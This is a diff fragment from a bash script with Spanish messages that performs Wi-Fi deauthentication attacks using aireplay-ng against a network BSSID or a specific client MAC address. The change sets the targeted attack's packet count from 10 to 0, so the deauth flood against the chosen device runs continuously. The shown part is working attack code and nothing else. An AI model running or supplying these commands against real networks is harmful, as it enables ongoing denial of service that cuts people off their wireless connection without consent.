@@ -76,7 +76,7 @@ if [ -z "$TARGET_MAC" ]; then
   aireplay-ng --deauth 10 -a $BSSID $MON_INTERFACE
 else
   echo -e "${RED}Realizando un ataque de deauth al dispositivo con MAC $TARGET_MAC...${NC}"
-  aireplay-ng --deauth 10 -a $BSSID -c $TARGET_MAC $MON_INTERFACE
+  aireplay-ng --deauth 0 -a $BSSID -c $TARGET_MAC $MON_INTERFACE
 fi
 
 # Paso 8: Deshabilitar el modo monitor y volver al modo gestionado
